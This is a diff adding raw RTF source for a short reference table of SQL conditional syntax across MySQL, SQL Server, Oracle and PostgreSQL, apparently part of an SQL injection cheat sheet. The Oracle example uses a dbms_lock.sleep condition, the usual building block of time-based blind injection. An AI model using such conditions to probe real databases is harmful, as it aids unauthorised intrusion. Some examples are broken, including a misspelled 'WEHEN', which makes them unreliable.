+\f8\i\b0 true-part
+\f9\i0\b ,
+\f8\i\b0 false-part
+\f7\i0 )\'a0
+\f6 (M)
+\f7 \'a0\uc0\u8232 SELECT IF(1=1,'true','false')
+\f6 \
+\pard\pardeftab720\partightenfactor0
+
+\b \cf1 SQL Server If Statement\
+\pard\tx220\tx720\pardeftab720\li720\fi-720\partightenfactor0
+\ls2\ilvl0
+\f7\b0 \cf1 \kerning1\expnd0\expndtw0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
+IF\'a0
+\f8\i condition
+\f7\i0 \'a0
+\f8\i true-part
+\f7\i0 \'a0ELSE\'a0
+\f8\i false-part
+\f6\i0 \'a0(S)\'a0\
+\ls2\ilvl0
+\f7 \kerning1\expnd0\expndtw0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
+IF (1=1) SELECT 'true' ELSE SELECT 'false'
+\f6 \
+\pard\pardeftab720\partightenfactor0
+
+\b \cf1 Oracle\'a0If Statement\
+\pard\tx220\tx720\pardeftab720\li720\fi-720\partightenfactor0
+\ls3\ilvl0
+\f7\b0 \cf1 \kerning1\expnd0\expndtw0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
+BEGIN\uc0\u8232 IF\'a0
+\f8\i condition
+\f7\i0 \'a0THEN\'a0
+\f8\i true-part
+\f7\i0 ; ELSE\'a0
+\f8\i false-part
+\f7\i0 ; END IF; END;
+\f6 \'a0(O)\'a0\
+\ls3\ilvl0
+\f7 \kerning1\expnd0\expndtw0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
+IF (1=1) THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END;
+\f6 \
+\pard\pardeftab720\partightenfactor0
+
+\b \cf1 PostgreSQL If Statement\
+\pard\tx220\tx720\pardeftab720\li720\fi-720\partightenfactor0
+\ls4\ilvl0
+\f7\b0 \cf1 \kerning1\expnd0\expndtw0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
+SELECT CASE WHEN\'a0
+\f8\i condition
+\f7\i0 \'a0THEN\'a0
+\f8\i true-part
+\f7\i0 \'a0ELSE\'a0
+\f8\i false-part
+\f6\i0 \'a0END; (P)\'a0\
+\ls4\ilvl0
+\f7 \kerning1\expnd0\expndtw0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
+SELECT CASE WEHEN (1=1) THEN 'A' ELSE 'B'END;
+\f6 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+
+\f5 \cf1 \kerning1\expnd0\expndtw0 \
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+\
+}
